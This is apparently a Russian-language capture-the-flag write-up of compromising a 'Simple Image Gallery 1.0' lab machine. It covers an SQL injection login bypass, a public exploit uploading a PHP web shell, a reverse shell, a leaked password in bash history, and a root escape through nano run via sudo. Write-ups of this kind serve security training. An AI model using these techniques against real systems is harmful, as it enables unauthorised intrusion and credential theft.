# Write-up: Simple Image Gallery

## Enumeration

Сканируем цель:

```bash
sudo nmap -sS -sV -sC --min-rate=1000 10.146.142.108
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Simple Image Gallery System
```

Открытых портов — **3**.

## Port 80

На `80` стандартная страница Apache:

![Apache default](img/Pasted_image_20261125151054.png)

## Port 8080

На `8080` основной сайт с редиректом на `login.php`:

![login.php](img/Pasted_image_20261125151153.png)

Пробуем SQL-инъекцию в логине:

```sql
' OR 1=1 -- -
```

Меня пускает:

![SQLi login](img/Pasted_image_20261125151251.png)

CMS называется **Simple Image Gallery**.

Смотрим версию — **1.0**:

![Версия 1.0](img/Pasted_image_20261125151413.png)

## Эксплоит

Для этой версии есть готовый эксплоит: [Exploit-DB #50214](https://www.exploit-db.com/exploits/50214).

![Exploit-DB 50214](img/Pasted_image_20261125151327.png)

![Запуск эксплоита](img/Pasted_image_20261125151756.png)

Получаем ссылку на загруженный шелл:

```text
http://10.144.139.199/gallery/uploads/1795609020_TagogqpcjsajfeibbsmLetta.php?cmd=whoami
```

В `cmd` можно положить свой payload:

![Webshell](img/Pasted_image_20261125151901.png)

Готовим reverse shell с URL-encode:

![URL-encode](img/Pasted_image_20261125152022.png)

Получаем reverse shell:

![Reverse shell](img/Pasted_image_20261125152143.png)

## Переход на mike

В `/var/backups/mike_home/backup/.bash_history` находим:

```text
sudo -lb3stpassw0rdbr0xx
```

Это пароль от `mike`:

```text
mike:b3stpassw0rdbr0xx
```

![bash_history](img/Pasted_image_20261125152242.png)

Заходим по SSH и забираем `user.txt`:

![user.txt](img/Pasted_image_20261125152419.png)

## PrivEsc

Проверяем `sudo`:

```bash
sudo -l
```

```text
User mike may run the following commands on ip-10-144-139-199:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

Смотрим `/opt/rootkit.sh`:

```bash
cat /opt/rootkit.sh
```

```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

case $ans in
   versioncheck)
       /usr/bin/rkhunter --versioncheck ;;
   update)
       /usr/bin/rkhunter --update;;
   list)
       /usr/bin/rkhunter --list;;
   read)
       /bin/nano /root/report.txt;;
   *)
       exit;;
esac
```

Запускаем:

```bash
sudo /bin/bash /opt/rootkit.sh
# read
```

`nano` открывает `/root/report.txt` от root. Из `nano` выходим в shell через `Ctrl+R`, `Ctrl+X` — и получаем командную строку от root:

![root via nano](img/Pasted_image_20261008221636.png)

Читаем `root.txt`:

![root.txt](img/Pasted_image_20261008221559.png)

## Хэш пароля админа

С правами root заходим в MySQL:

```bash
mysql -u root -p
```

И смотрим таблицу `users`:

```sql
SELECT * FROM users;
```

## Итоговая схема (Kill Chain)

`8080 → Simple Image Gallery 1.0` → `SQLi-логин (' OR 1=1 -- -)` → `Exploit-DB 50214 (upload shell)` → `RCE` → `/var/backups/mike_home/backup/.bash_history (mike:b3stpassw0rdbr0xx)` → `SSH` → `sudo rootkit.sh → nano → Ctrl+R, Ctrl+X → root` → `mysql users dump`